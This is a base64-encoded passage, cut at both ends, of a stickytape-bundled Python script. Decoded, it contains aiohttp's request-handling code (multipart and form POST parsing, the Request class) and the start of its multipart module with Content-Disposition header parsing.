JcblxyXG4gICAgYXN5bmMgZGVmIG11bHRpcGFydChzZWxmKSAtPiBNdWx0aXBhcnRSZWFkZXI6XHJcbiAgICAgICAgIiIiUmV0dXJuIGFzeW5jIGl0ZXJhdG9yIHRvIHByb2Nlc3MgQk9EWSBhcyBtdWx0aXBhcnQuIiIiXHJcbiAgICAgICAgcmV0dXJuIE11bHRpcGFydFJlYWRlcihzZWxmLl9oZWFkZXJzLCBzZWxmLl9wYXlsb2FkKVxyXG5cclxuICAgIGFzeW5jIGRlZiBwb3N0KHNlbGYpIC0+ICJNdWx0aURpY3RQcm94eVtVbmlvbltzdHIsIGJ5dGVzLCBGaWxlRmllbGRdXSI6XHJcbiAgICAgICAgIiIiUmV0dXJuIFBPU1QgcGFyYW1ldGVycy4iIiJcclxuICAgICAgICBpZiBzZWxmLl9wb3N0IGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICByZXR1cm4gc2VsZi5fcG9zdFxyXG4gICAgICAgIGlmIHNlbGYuX21ldGhvZCBub3QgaW4gc2VsZi5QT1NUX01FVEhPRFM6XHJcbiAgICAgICAgICAgIHNlbGYuX3Bvc3QgPSBNdWx0aURpY3RQcm94eShNdWx0aURpY3QoKSlcclxuICAgICAgICAgICAgcmV0dXJuIHNlbGYuX3Bvc3RcclxuXHJcbiAgICAgICAgY29udGVudF90eXBlID0gc2VsZi5jb250ZW50X3R5cGVcclxuICAgICAgICBpZiBjb250ZW50X3R5cGUgbm90IGluIChcclxuICAgICAgICAgICAgIiIsXHJcbiAgICAgICAgICAgICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiLFxyXG4gICAgICAgICAgICAibXVsdGlwYXJ0L2Zvcm0tZGF0YSIsXHJcbiAgICAgICAgKTpcclxuICAgICAgICAgICAgc2VsZi5fcG9zdCA9IE11bHRpRGljdFByb3h5KE11bHRpRGljdCgpKVxyXG4gICAgICAgICAgICByZXR1cm4gc2VsZi5fcG9zdFxyXG5cclxuICAgICAgICBvdXQgPSBNdWx0aURpY3QoKSAgIyB0eXBlOiBNdWx0aURpY3RbVW5pb25bc3RyLCBieXRlcywgRmlsZUZpZWxkXV1cclxuXHJcbiAgICAgICAgaWYgY29udGVudF90eXBlID09ICJtdWx0aXBhcnQvZm9ybS1kYXRhIjpcclxuICAgICAgICAgICAgbXVsdGlwYXJ0ID0gYXdhaXQgc2VsZi5tdWx0aXBhcnQoKVxyXG4gICAgICAgICAgICBtYXhfc2l6ZSA9IHNlbGYuX2NsaWVudF9tYXhfc2l6ZVxyXG5cclxuICAgICAgICAgICAgZmllbGQgPSBhd2FpdCBtdWx0aXBhcnQubmV4dCgpXHJcbiAgICAgICAgICAgIHdoaWxlIGZpZWxkIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICAgICAgc2l6ZSA9IDBcclxuICAgICAgICAgICAgICAgIGZpZWxkX2N0ID0gZmllbGQuaGVhZGVycy5nZXQoaGRycy5DT05URU5UX1RZUEUpXHJcblxyXG4gICAgICAgICAgICAgICAgaWYgaXNpbnN0YW5jZShmaWVsZCwgQm9keVBhcnRSZWFkZXIpOlxyXG4gICAgICAgICAgICAgICAgICAgIGFzc2VydCBmaWVsZC5uYW1lIGlzIG5vdCBOb25lXHJcblxyXG4gICAgICAgICAgICAgICAgICAgICMgTm90ZSB0aGF0IGFjY29yZGluZyB0byBSRkMgNzU3OCwgdGhlIENvbnRlbnQtVHlwZSBoZWFkZXJcclxuICAgICAgICAgICAgICAgICAgICAjIGlzIG9wdGlvbmFsLCBldmVuIGZvciBmaWxlcywgc28gd2UgY2FuXCd0IGFzc3VtZSBpdFwnc1xyXG4gICAgICAgICAgICAgICAgICAgICMgcHJlc2VudC5cclxuICAgICAgICAgICAgICAgICAgICAjIGh0dHBzOi8vdG9vbHMuaWV0Zi5vcmcvaHRtbC9yZmM3NTc4I3NlY3Rpb24tNC40XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgZmllbGQuZmlsZW5hbWU6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICMgc3RvcmUgZmlsZSBpbiB0ZW1wIGZpbGVcclxuICAgICAgICAgICAgICAgICAgICAgICAgdG1wID0gdGVtcGZpbGUuVGVtcG9yYXJ5RmlsZSgpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rID0gYXdhaXQgZmllbGQucmVhZF9jaHVuayhzaXplPTIgKiogMTYpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHdoaWxlIGNodW5rOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgY2h1bmsgPSBmaWVsZC5kZWNvZGUoY2h1bmspXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0bXAud3JpdGUoY2h1bmspXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzaXplICs9IGxlbihjaHVuaylcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIDAgPCBtYXhfc2l6ZSA8IHNpemU6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG1wLmNsb3NlKClcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICByYWlzZSBIVFRQUmVxdWVzdEVudGl0eVRvb0xhcmdlKFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtYXhfc2l6ZT1tYXhfc2l6ZSwgYWN0dWFsX3NpemU9c2l6ZVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIClcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNodW5rID0gYXdhaXQgZmllbGQucmVhZF9jaHVuayhzaXplPTIgKiogMTYpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHRtcC5zZWVrKDApXHJcblxyXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiBmaWVsZF9jdCBpcyBOb25lOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZmllbGRfY3QgPSAiYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtIlxyXG5cclxuICAgICAgICAgICAgICAgICAgICAgICAgZmYgPSBGaWxlRmllbGQoXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWVsZC5uYW1lLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZmllbGQuZmlsZW5hbWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXN0KGlvLkJ1ZmZlcmVkUmVhZGVyLCB0bXApLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZmllbGRfY3QsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaWVsZC5oZWFkZXJzLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIG91dC5hZGQoZmllbGQubmFtZSwgZmYpXHJcbiAgICAgICAgICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgIyBkZWFsIHdpdGggb3JkaW5hcnkgZGF0YVxyXG4gICAgICAgICAgICAgICAgICAgICAgICB2YWx1ZSA9IGF3YWl0IGZpZWxkLnJlYWQoZGVjb2RlPVRydWUpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGZpZWxkX2N0IGlzIE5vbmUgb3IgZmllbGRfY3Quc3RhcnRzd2l0aCgidGV4dC8iKTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNoYXJzZXQgPSBmaWVsZC5nZXRfY2hhcnNldChkZWZhdWx0PSJ1dGYtOCIpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvdXQuYWRkKGZpZWxkLm5hbWUsIHZhbHVlLmRlY29kZShjaGFyc2V0KSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIG91dC5hZGQoZmllbGQubmFtZSwgdmFsdWUpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHNpemUgKz0gbGVuKHZhbHVlKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAwIDwgbWF4X3NpemUgPCBzaXplOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmFpc2UgSFRUUFJlcXVlc3RFbnRpdHlUb29MYXJnZShcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtYXhfc2l6ZT1tYXhfc2l6ZSwgYWN0dWFsX3NpemU9c2l6ZVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAiVG8gZGVjb2RlIG5lc3RlZCBtdWx0aXBhcnQgeW91IG5lZWQgIiAidG8gdXNlIGN1c3RvbSByZWFkZXIiLFxyXG4gICAgICAgICAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgICAgICAgICBmaWVsZCA9IGF3YWl0IG11bHRpcGFydC5uZXh0KClcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBkYXRhID0gYXdhaXQgc2VsZi5yZWFkKClcclxuICAgICAgICAgICAgaWYgZGF0YTpcclxuICAgICAgICAgICAgICAgIGNoYXJzZXQgPSBzZWxmLmNoYXJzZXQgb3IgInV0Zi04IlxyXG4gICAgICAgICAgICAgICAgb3V0LmV4dGVuZChcclxuICAgICAgICAgICAgICAgICAgICBwYXJzZV9xc2woXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEucnN0cmlwKCkuZGVjb2RlKGNoYXJzZXQpLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBrZWVwX2JsYW5rX3ZhbHVlcz1UcnVlLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICBlbmNvZGluZz1jaGFyc2V0LFxyXG4gICAgICAgICAgICAgICAgICAgIClcclxuICAgICAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgc2VsZi5fcG9zdCA9IE11bHRpRGljdFByb3h5KG91dClcclxuICAgICAgICByZXR1cm4gc2VsZi5fcG9zdFxyXG5cclxuICAgIGRlZiBnZXRfZXh0cmFfaW5mbyhzZWxmLCBuYW1lOiBzdHIsIGRlZmF1bHQ6IEFueSA9IE5vbmUpIC0+IEFueTpcclxuICAgICAgICAiIiJFeHRyYSBpbmZvIGZyb20gcHJvdG9jb2wgdHJhbnNwb3J0IiIiXHJcbiAgICAgICAgcHJvdG9jb2wgPSBzZWxmLl9wcm90b2NvbFxyXG4gICAgICAgIGlmIHByb3RvY29sIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHJldHVybiBkZWZhdWx0XHJcblxyXG4gICAgICAgIHRyYW5zcG9ydCA9IHByb3RvY29sLnRyYW5zcG9ydFxyXG4gICAgICAgIGlmIHRyYW5zcG9ydCBpcyBOb25lOlxyXG4gICAgICAgICAgICByZXR1cm4gZGVmYXVsdFxyXG5cclxuICAgICAgICByZXR1cm4gdHJhbnNwb3J0LmdldF9leHRyYV9pbmZvKG5hbWUsIGRlZmF1bHQpXHJcblxyXG4gICAgZGVmIF9fcmVwcl9fKHNlbGYpIC0+IHN0cjpcclxuICAgICAgICBhc2NpaV9lbmNvZGFibGVfcGF0aCA9IHNlbGYucGF0aC5lbmNvZGUoImFzY2lpIiwgImJhY2tzbGFzaHJlcGxhY2UiKS5kZWNvZGUoXHJcbiAgICAgICAgICAgICJhc2NpaSJcclxuICAgICAgICApXHJcbiAgICAgICAgcmV0dXJuICI8e30ge30ge30gPiIuZm9ybWF0KFxyXG4gICAgICAgICAgICBzZWxmLl9fY2xhc3NfXy5fX25hbWVfXywgc2VsZi5fbWV0aG9kLCBhc2NpaV9lbmNvZGFibGVfcGF0aFxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgX19lcV9fKHNlbGYsIG90aGVyOiBvYmplY3QpIC0+IGJvb2w6XHJcbiAgICAgICAgcmV0dXJuIGlkKHNlbGYpID09IGlkKG90aGVyKVxyXG5cclxuICAgIGRlZiBfX2Jvb2xfXyhzZWxmKSAtPiBib29sOlxyXG4gICAgICAgIHJldHVybiBUcnVlXHJcblxyXG4gICAgYXN5bmMgZGVmIF9wcmVwYXJlX2hvb2soc2VsZiwgcmVzcG9uc2U6IFN0cmVhbVJlc3BvbnNlKSAtPiBOb25lOlxyXG4gICAgICAgIHJldHVyblxyXG5cclxuICAgIGRlZiBfY2FuY2VsKHNlbGYsIGV4YzogQmFzZUV4Y2VwdGlvbikgLT4gTm9uZTpcclxuICAgICAgICBzZWxmLl9wYXlsb2FkLnNldF9leGNlcHRpb24oZXhjKVxyXG5cclxuXHJcbmNsYXNzIFJlcXVlc3QoQmFzZVJlcXVlc3QpOlxyXG5cclxuICAgIEFUVFJTID0gQmFzZVJlcXVlc3QuQVRUUlMgfCBmcm96ZW5zZXQoWyJfbWF0Y2hfaW5mbyJdKVxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCAqYXJnczogQW55LCAqKmt3YXJnczogQW55KSAtPiBOb25lOlxyXG4gICAgICAgIHN1cGVyKCkuX19pbml0X18oKmFyZ3MsICoqa3dhcmdzKVxyXG5cclxuICAgICAgICAjIG1hdGNoZGljdCwgcm91dGVfbmFtZSwgaGFuZGxlclxyXG4gICAgICAgICMgb3IgaW5mb3JtYXRpb24gYWJvdXQgdHJhdmVyc2FsIGxvb2t1cFxyXG5cclxuICAgICAgICAjIGluaXRpYWxpemVkIGFmdGVyIHJvdXRlIHJlc29sdmluZ1xyXG4gICAgICAgIHNlbGYuX21hdGNoX2luZm8gPSBOb25lICAjIHR5cGU6IE9wdGlvbmFsW1VybE1hcHBpbmdNYXRjaEluZm9dXHJcblxyXG4gICAgaWYgREVCVUc6XHJcblxyXG4gICAgICAgIGRlZiBfX3NldGF0dHJfXyhzZWxmLCBuYW1lOiBzdHIsIHZhbDogQW55KSAtPiBOb25lOlxyXG4gICAgICAgICAgICBpZiBuYW1lIG5vdCBpbiBzZWxmLkFUVFJTOlxyXG4gICAgICAgICAgICAgICAgd2FybmluZ3Mud2FybihcclxuICAgICAgICAgICAgICAgICAgICAiU2V0dGluZyBjdXN0b20ge30ue30gYXR0cmlidXRlICJcclxuICAgICAgICAgICAgICAgICAgICAiaXMgZGlzY291cmFnZWQiLmZvcm1hdChzZWxmLl9fY2xhc3NfXy5fX25hbWVfXywgbmFtZSksXHJcbiAgICAgICAgICAgICAgICAgICAgRGVwcmVjYXRpb25XYXJuaW5nLFxyXG4gICAgICAgICAgICAgICAgICAgIHN0YWNrbGV2ZWw9MixcclxuICAgICAgICAgICAgICAgIClcclxuICAgICAgICAgICAgc3VwZXIoKS5fX3NldGF0dHJfXyhuYW1lLCB2YWwpXHJcblxyXG4gICAgZGVmIGNsb25lKFxyXG4gICAgICAgIHNlbGYsXHJcbiAgICAgICAgKixcclxuICAgICAgICBtZXRob2Q6IHN0ciA9IHNlbnRpbmVsLFxyXG4gICAgICAgIHJlbF91cmw6IFN0ck9yVVJMID0gc2VudGluZWwsXHJcbiAgICAgICAgaGVhZGVyczogTG9vc2VIZWFkZXJzID0gc2VudGluZWwsXHJcbiAgICAgICAgc2NoZW1lOiBzdHIgPSBzZW50aW5lbCxcclxuICAgICAgICBob3N0OiBzdHIgPSBzZW50aW5lbCxcclxuICAgICAgICByZW1vdGU6IHN0ciA9IHNlbnRpbmVsLFxyXG4gICAgKSAtPiAiUmVxdWVzdCI6XHJcbiAgICAgICAgcmV0ID0gc3VwZXIoKS5jbG9uZShcclxuICAgICAgICAgICAgbWV0aG9kPW1ldGhvZCxcclxuICAgICAgICAgICAgcmVsX3VybD1yZWxfdXJsLFxyXG4gICAgICAgICAgICBoZWFkZXJzPWhlYWRlcnMsXHJcbiAgICAgICAgICAgIHNjaGVtZT1zY2hlbWUsXHJcbiAgICAgICAgICAgIGhvc3Q9aG9zdCxcclxuICAgICAgICAgICAgcmVtb3RlPXJlbW90ZSxcclxuICAgICAgICApXHJcbiAgICAgICAgbmV3X3JldCA9IGNhc3QoUmVxdWVzdCwgcmV0KVxyXG4gICAgICAgIG5ld19yZXQuX21hdGNoX2luZm8gPSBzZWxmLl9tYXRjaF9pbmZvXHJcbiAgICAgICAgcmV0dXJuIG5ld19yZXRcclxuXHJcbiAgICBAcmVpZnlcclxuICAgIGRlZiBtYXRjaF9pbmZvKHNlbGYpIC0+ICJVcmxNYXBwaW5nTWF0Y2hJbmZvIjpcclxuICAgICAgICAiIiJSZXN1bHQgb2Ygcm91dGUgcmVzb2x2aW5nLiIiIlxyXG4gICAgICAgIG1hdGNoX2luZm8gPSBzZWxmLl9tYXRjaF9pbmZvXHJcbiAgICAgICAgYXNzZXJ0IG1hdGNoX2luZm8gaXMgbm90IE5vbmVcclxuICAgICAgICByZXR1cm4gbWF0Y2hfaW5mb1xyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGFwcChzZWxmKSAtPiAiQXBwbGljYXRpb24iOlxyXG4gICAgICAgICIiIkFwcGxpY2F0aW9uIGluc3RhbmNlLiIiIlxyXG4gICAgICAgIG1hdGNoX2luZm8gPSBzZWxmLl9tYXRjaF9pbmZvXHJcbiAgICAgICAgYXNzZXJ0IG1hdGNoX2luZm8gaXMgbm90IE5vbmVcclxuICAgICAgICByZXR1cm4gbWF0Y2hfaW5mby5jdXJyZW50X2FwcFxyXG5cclxuICAgIEBwcm9wZXJ0eVxyXG4gICAgZGVmIGNvbmZpZ19kaWN0KHNlbGYpIC0+IENoYWluTWFwUHJveHk6XHJcbiAgICAgICAgbWF0Y2hfaW5mbyA9IHNlbGYuX21hdGNoX2luZm9cclxuICAgICAgICBhc3NlcnQgbWF0Y2hfaW5mbyBpcyBub3QgTm9uZVxyXG4gICAgICAgIGxzdCA9IG1hdGNoX2luZm8uYXBwc1xyXG4gICAgICAgIGFwcCA9IHNlbGYuYXBwXHJcbiAgICAgICAgaWR4ID0gbHN0LmluZGV4KGFwcClcclxuICAgICAgICBzdWJsaXN0ID0gbGlzdChyZXZlcnNlZChsc3RbOiBpZHggKyAxXSkpXHJcbiAgICAgICAgcmV0dXJuIENoYWluTWFwUHJveHkoc3VibGlzdClcclxuXHJcbiAgICBhc3luYyBkZWYgX3ByZXBhcmVfaG9vayhzZWxmLCByZXNwb25zZTogU3RyZWFtUmVzcG9uc2UpIC0+IE5vbmU6XHJcbiAgICAgICAgbWF0Y2hfaW5mbyA9IHNlbGYuX21hdGNoX2luZm9cclxuICAgICAgICBpZiBtYXRjaF9pbmZvIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG4gICAgICAgIGZvciBhcHAgaW4gbWF0Y2hfaW5mby5fYXBwczpcclxuICAgICAgICAgICAgYXdhaXQgYXBwLm9uX3Jlc3BvbnNlX3ByZXBhcmUuc2VuZChzZWxmLCByZXNwb25zZSlcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2Fpb2h0dHAvbXVsdGlwYXJ0LnB5JywgYidpbXBvcnQgYmFzZTY0XHJcbmltcG9ydCBiaW5hc2NpaVxyXG5pbXBvcnQganNvblxyXG5pbXBvcnQgcmVcclxuaW1wb3J0IHV1aWRcclxuaW1wb3J0IHdhcm5pbmdzXHJcbmltcG9ydCB6bGliXHJcbmZyb20gY29sbGVjdGlvbnMgaW1wb3J0IGRlcXVlXHJcbmZyb20gdHlwZXMgaW1wb3J0IFRyYWNlYmFja1R5cGVcclxuZnJvbSB0eXBpbmcgaW1wb3J0IChcclxuICAgIFRZUEVfQ0hFQ0tJTkcsXHJcbiAgICBBbnksXHJcbiAgICBBc3luY0l0ZXJhdG9yLFxyXG4gICAgRGVxdWUsXHJcbiAgICBEaWN0LFxyXG4gICAgSXRlcmF0b3IsXHJcbiAgICBMaXN0LFxyXG4gICAgTWFwcGluZyxcclxuICAgIE9wdGlvbmFsLFxyXG4gICAgU2VxdWVuY2UsXHJcbiAgICBUdXBsZSxcclxuICAgIFR5cGUsXHJcbiAgICBVbmlvbixcclxuICAgIGNhc3QsXHJcbilcclxuZnJvbSB1cmxsaWIucGFyc2UgaW1wb3J0IHBhcnNlX3FzbCwgdW5xdW90ZSwgdXJsZW5jb2RlXHJcblxyXG5mcm9tIG11bHRpZGljdCBpbXBvcnQgQ0lNdWx0aURpY3QsIENJTXVsdGlEaWN0UHJveHksIE11bHRpTWFwcGluZ1xyXG5cclxuZnJvbSAuaGRycyBpbXBvcnQgKFxyXG4gICAgQ09OVEVOVF9ESVNQT1NJVElPTixcclxuICAgIENPTlRFTlRfRU5DT0RJTkcsXHJcbiAgICBDT05URU5UX0xFTkdUSCxcclxuICAgIENPTlRFTlRfVFJBTlNGRVJfRU5DT0RJTkcsXHJcbiAgICBDT05URU5UX1RZUEUsXHJcbilcclxuZnJvbSAuaGVscGVycyBpbXBvcnQgQ0hBUiwgVE9LRU4sIHBhcnNlX21pbWV0eXBlLCByZWlmeVxyXG5mcm9tIC5odHRwIGltcG9ydCBIZWFkZXJzUGFyc2VyXHJcbmZyb20gLnBheWxvYWQgaW1wb3J0IChcclxuICAgIEpzb25QYXlsb2FkLFxyXG4gICAgTG9va3VwRXJyb3IsXHJcbiAgICBPcmRlcixcclxuICAgIFBheWxvYWQsXHJcbiAgICBTdHJpbmdQYXlsb2FkLFxyXG4gICAgZ2V0X3BheWxvYWQsXHJcbiAgICBwYXlsb2FkX3R5cGUsXHJcbilcclxuZnJvbSAuc3RyZWFtcyBpbXBvcnQgU3RyZWFtUmVhZGVyXHJcblxyXG5fX2FsbF9fID0gKFxyXG4gICAgIk11bHRpcGFydFJlYWRlciIsXHJcbiAgICAiTXVsdGlwYXJ0V3JpdGVyIixcclxuICAgICJCb2R5UGFydFJlYWRlciIsXHJcbiAgICAiQmFkQ29udGVudERpc3Bvc2l0aW9uSGVhZGVyIixcclxuICAgICJCYWRDb250ZW50RGlzcG9zaXRpb25QYXJhbSIsXHJcbiAgICAicGFyc2VfY29udGVudF9kaXNwb3NpdGlvbiIsXHJcbiAgICAiY29udGVudF9kaXNwb3NpdGlvbl9maWxlbmFtZSIsXHJcbilcclxuXHJcblxyXG5pZiBUWVBFX0NIRUNLSU5HOiAgIyBwcmFnbWE6IG5vIGNvdmVyXHJcbiAgICBmcm9tIC5jbGllbnRfcmVxcmVwIGltcG9ydCBDbGllbnRSZXNwb25zZVxyXG5cclxuXHJcbmNsYXNzIEJhZENvbnRlbnREaXNwb3NpdGlvbkhlYWRlcihSdW50aW1lV2FybmluZyk6XHJcbiAgICBwYXNzXHJcblxyXG5cclxuY2xhc3MgQmFkQ29udGVudERpc3Bvc2l0aW9uUGFyYW0oUnVudGltZVdhcm5pbmcpOlxyXG4gICAgcGFzc1xyXG5cclxuXHJcbmRlZiBwYXJzZV9jb250ZW50X2Rpc3Bvc2l0aW9uKFxyXG4gICAgaGVhZGVyOiBPcHRpb25hbFtzdHJdLFxyXG4pIC0+IFR1cGxlW09wdGlvbmFsW3N0cl0sIERpY3Rbc3RyLCBzdHJdXTpcclxuICAgIGRlZiBpc190b2tlbihzdHJpbmc6IHN0cikgLT4gYm9vbDpcclxuICAgICAgICByZXR1cm4gYm9vbChzdHJpbmcpIGFuZCBUT0tFTiA+PSBzZXQoc3RyaW5nKVxyXG5cclxuICAgIGRlZiBpc19xdW90ZWQoc3RyaW5nOiBzdHIpIC0+IGJvb2w6XHJcbiAgICAgICAgcmV0dXJuIHN0cmluZ1swXSA9PSBzdHJpbmdbLTFdID09IFwnIlwnXHJcblxyXG4gICAgZGVmIGlzX3JmYzU5ODcoc3RyaW5nOiBzdHIpIC0+IGJvb2w6XHJcbiAgICAgICAgcmV0dXJuIGlzX3Rva2VuKHN0cmluZykgYW5kIHN0cmluZy5jb3VudCgiXCciKSA9PSAyXHJcblxyXG4gICAgZGVmIGlzX2V4dGVuZGVkX3BhcmFtKHN0cmluZzogc3RyKSAtPiBib29sOlxyXG4gICAgICAgIHJldHVybiBzdHJpbmcuZW5kc3dpdGgoIioiKVxyXG5cclxuICAgIGRlZiBpc19jb250aW51b3VzX3BhcmFtKHN0cmluZzogc3RyKSAtPiBib29sOlxyXG4gICAgICAgIHBvcyA9IHN0cmluZy5maW5kKCIqIikgKyAxXHJcbiAgICAgICAgaWYgbm90IHBvczpcclxuICAgICAgICAgICAgcmV0dXJuIEZhbHNlXHJcbiAgICAgICAgc3Vic3RyaW5nID0gc3RyaW5nW3BvczotMV0gaWYgc3RyaW5nLmVuZHN3aXRoKCIqIikgZWxzZSBzdHJpbmdbcG9zOl1cclxuICAgICAgICByZXR1cm4gc3Vic3RyaW5nLmlzZGlnaXQoKVxyXG5cclxuICAgIGRlZiB1bmVzY2FwZSh0ZXh0OiBzdHIsICosIGNoYXJzOiBzdHIgPSAiIi5qb2luKG1hcChyZS5lc2NhcGUsIENIQVIpKSkgLT4gc3RyOlxyXG4gICAgICAgIHJldHVybiByZS5zdWIoZiJcXFxcXFxcXChbe2NoYXJzfV0pIiwgIlxcXFwxIiwgdGV4dClcclxuXHJcbiAgICBpZiBub3QgaGVhZGVyOlxyXG4gICAgICAgIHJldHVybiBOb25lLCB7fVxyXG5cclxuICAgIGRpc3B0eXBlLCAqcGFydHMgPSBoZWFkZXIuc3BsaXQoIjsiKVxyXG4gICAgaWYgbm90IGlzX3Rva2VuKGRpc3B0eXBlKTpcclxuICAgICAgICB3YXJuaW5ncy53YXJuKEJhZENvbnRlbnREaXNwb3NpdGlvbkhlYWRlcihoZWFkZXIpKVxyXG4gICAgICAgIHJldHVybiBOb25lLCB7fVxyXG5cclxuICAgIHBhcmFtcyA9IHt9ICAjIHR5cGU6IERpY3Rbc3RyLCBzdHJdXHJcbiAgICB3aGlsZSBwYXJ0czpcclxuICAgICAgICBpdGVtID0gcGFydHMucG9wKDApXHJcblxyXG4gICAgICAgIGlmICI9IiBub3QgaW4gaXRlbTpcclxuICAgICAgICAgICAgd2FybmluZ3Mud2FybihCYWRDb250ZW50RGlzcG9zaXRpb25IZWFkZXIoaGVhZGVyKSlcclxuICAgICAgICAgICAgcmV0dXJuIE5vbmUsIHt9XHJcblxyXG4gICAgICAgIGtleSwgdmFsdWUgPSBpdGVtLnNwbGl0KCI9IiwgMSlcclxuICAgICAgICBrZXkgPSBrZXkubG93ZXIoKS5zdHJpcCgpXHJcbiAgICAgICAgdmFsdWUgPSB2YWx1ZS5sc3RyaXAoKVxyXG5cclxuICAgICAgICBpZiBrZXkgaW4gcGFyYW1zOlxyXG4gICAgICAgICAgICB3YXJuaW5ncy53YXJuKEJhZENvbnRlbnREaXNwb3NpdGlvbkhlYWRlcihoZWFkZXIpKVxyXG4gICAgICAgICAgICByZXR1cm4gTm9uZSwge31cclxuXHJcbiAgICAgICAgaWYgbm90IGlzX3Rva2VuKGtleSk6XHJcbiAgICAgICAgICAgIHdhcm5pbmdzLndhcm4oQmFkQ29udGVudERpc3Bvc2l0aW9uUGFyYW0oaXRlbSkpXHJcbiAgICAgICAgICAgIGNvbnRpbnVlXHJcblxyXG4gICAgICAgIGVsaWYgaXNfY29udGludW91c19wYXJhbShrZXkpOlxyXG4gICAgICAgICAgICBpZiBpc19xdW90ZWQodmFsdWUpOlxyXG4gICAgICAgICAgICAgICAgdmFsdWUgPSB1bmVzY2FwZSh2YWx1ZVsxOi0xXSlcclxuICAgICAgICAgICAgZWxpZiBub3QgaXNfdG9rZW4odmFsdWUpOlxyXG4gICAgICAgICAgICAgICAgd2FybmluZ3Mud2FybihCYWRDb250ZW50RGlzcG9zaXRpb25QYXJhbShpdGVtKSlcclxuICAgICAgICAgICAgICAgIGNvbnRpbnVlXHJcblxyXG4gICAgICAgIGVsaWYgaXNfZXh0ZW5kZWRfcGFyYW0oa2V5KTpcclxuICAgICAgICAgICAgaWYgaXNfcmZjNTk4Nyh2YWx1ZSk6XHJcbiAgICAgICAgICAgICAgICBlbmNvZGluZywgXywgdmFsdWUgPSB2YWx1ZS5zcGxpdCgiXCciLCAyKVxyXG4gICAgICAgICAgICAgICAgZW5jb2RpbmcgPSBlbmNvZGluZyBvciAidXRmLTgiXHJcbiAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICB3YXJuaW5ncy53YXJuKEJhZENvbnRlbnREaXNwb3NpdGlvblBhcmFtKGl0ZW0pKVxyXG4gICAgICAgICAgICAgICAgY29udGludWVcclxuXHJcbiAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgIHZhbHVlID0gdW5xdW90ZSh2YWx1ZSwgZW5jb2RpbmcsICJzdHJpY3QiKVxyXG4gICAgICAgICAgICBleGNlcHQgVW5pY29kZURlY29kZUVycm9yOiAgIyBwcmFnbWE6IG5vY292ZXJcclxuICAgICAgICAgICAgICAgIHdhcm5pbmdzLndhcm4oQmFkQ29udGVudERpc3Bvc2l0aW9uUGFyYW0oaXRlbSkpXHJcbiAgICAgICAgICAgICAgICBjb250aW51ZVxyXG5cclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBmYWlsZWQgPSBUcnVlXHJcbiAgICAgICAgICAgIGlmIGlzX3F1b3RlZCh2YWx1ZSk6XHJcbiAgICAgICAgICAgICAgICBmYWlsZWQgPSBGYWxzZVxyXG4gICAgICAgICAgICAgICAgdmFsdWUgPSB1bmVzY2FwZSh2YWx1ZVsxOi0xXS5sc3RyaXAoIlxcXFwvIikpXHJcbiAgICAgICAgICAgIGVsaWYgaXNfdG9rZW4odmFsdWUpOlxyXG4gICAgICAgICAgICAgICAgZmFpbGVkID0gRmFsc2VcclxuICAgICAgICAgICAgZWxpZiBwYXJ0czpcclxuICAgICAgICAgICAgICAgICMgbWF5YmUganVzdC